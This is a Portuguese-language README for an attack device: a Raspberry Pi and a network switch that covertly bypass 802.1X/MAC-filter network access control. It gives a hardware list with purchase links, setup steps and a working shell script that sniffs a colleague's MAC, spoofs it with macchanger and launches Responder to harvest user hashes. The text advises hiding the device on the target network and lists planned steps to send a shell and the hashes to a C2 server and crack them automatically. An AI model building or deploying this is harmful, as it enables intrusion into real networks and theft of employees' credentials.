# Projeto

O Objetivo desse projeto visa realizar de forma "automatizada" e "stealth" o bypass de NAC 802.1x PNAC (Filtro de MAC) e iniciar quaisquer scripts/exploits/ferramentas ao ingressar dentro da rede alvo, utilizando ferramentas como RaspberryPI e um Switch de rede, ambos de fácil acesso para compra.

No cenário proposto, um atacante utilizará a ferramenta + scripts contruidos para realizar o ataque de forma automatizada. Ao obter acesso local aos cabos de rede referente a rede alvo, basta plugar um computador de um colaborador no switch para clonar seu MAC, e depois o mesmo ingresará na rede, assim rodando as automações. Em sequência é recomendável que o device seja escondido equanto estiver conectado ao cabo de rede, para que permaneça na rede realizando os ataques.

Para o caso atual, a ferramenta a ser ativada sera o "Responder", o qual terá função de coletar Hashes de usuários na rede e exfiltra-los para um servidor externo (C2).

# Equipamentos

## V1 - RaspberryPi3
* Raspberry PI (recomendável PI3 1GB RAM)
* 1 Cabo microUSB/USB-C (Depende do RaspberryPI)
* Tela Touch RaspberryPI (Recomendável/Não Obrigatório)
* 1 PowerBank (Pequeno)
* Teclado Bluethooth (Recomendável/Não Obrigatório)

## V2 - Pwnagotchi
https://pwnagotchi.ai/
* UPS Lite V1.2 Poder HAT Board (Bateria): https://pt.aliexpress.com/item/1005006685459725.html?spm=a2g0o.order_list.order_list_main.41.a4c2caa4EFlwFG&gatewayAdapt=glo2bra
* RaspberryPI ZeroW Dev Board(Solded): https://pt.aliexpress.com/item/1005005171008740.html?spm=a2g0o.order_list.order_list_main.11.a4c2caa4EFlwFG&gatewayAdapt=glo2bra
* RaspberryPI ZeroW Ethernet HUB, HUB USB... (Inputs): https://pt.aliexpress.com/item/4000022488083.html?spm=a2g0o.order_list.order_list_main.5.a4c2caa4EFlwFG&gatewayAdapt=glo2bra
* E-Ink Display HAT (Screen): https://pt.aliexpress.com/item/4000477030075.html?spm=a2g0o.order_list.order_list_main.29.a4c2caa4EFlwFG&gatewayAdapt=glo2bra
* Adaptador Wi-FI - USB (SSH): https://pt.aliexpress.com/item/1005006040988974.html?spm=a2g0o.order_list.order_list_main.23.a4c2caa4EFlwFG&gatewayAdapt=glo2bra

## Geral
* Switch de rede
* Conversor de energia do Switch para USB
* 2 Cabos de Rede RJ45 (Pequenos/Retrateis) 1metro
* Adaptador RJ45-USB
* 
# Etapas:

## Setup Raspberry
- [ ] kali ISO: https://www.kali.org/docs/arm/raspberry-pi-3/
- [ ] kali LCD Screen: https://github.com/lcdwiki/LCD-show-kali
- [ ] Responder as a Service: https://github.com/eep0x10/runAs.service/tree/main
- [ ] Scripts:


start_resp.sh
```
# Reset MAC Address Random
#sudo ifconfig eth1 hw ether $(ethtool -P eth1 | awk '{print $3}') 1>&-

while true;do
echo "[+] Capturando MAC Address, aguarde 10 segundos..."

echo "" > /tmp/captured_mac.txt

sudo tshark -i eth1 -Y "_ws.col.protocol matches \"IGMPv3\"" -T fields -e eth.src -a duration:10 2>&- | sort -u > /tmp/captured_mac.txt
echo "64:1c:67:e6:d8:a0" > /tmp/captured_mac.txt #HARCODED
# Caminho do arquivo de onde ler o valor
arquivo="/tmp/captured_mac.txt"
valor=$(cat "$arquivo" | tr -d '[:space:]')
# Executa o comando macchanger com o valor lido do arquivo
sudo macchanger -m "$valor" eth1 2>&- # Substitua "eth1" pela interface de rede desejada

cd /usr/share/responder
sudo python3 automation.py
done
```

# Next Steps
- [ ] Enviar uma shell para o C2, a fim de ter pesistência e controle remoto do dispositivo
- [ ] Exfiltrar hashes para o C2
- [ ] Quebrar os hashes de forma automatizada
- [ ] Notificar o atacante ao realizar uma quebra de hashe
- [ ] Enumerar permissões do hashe obtido*
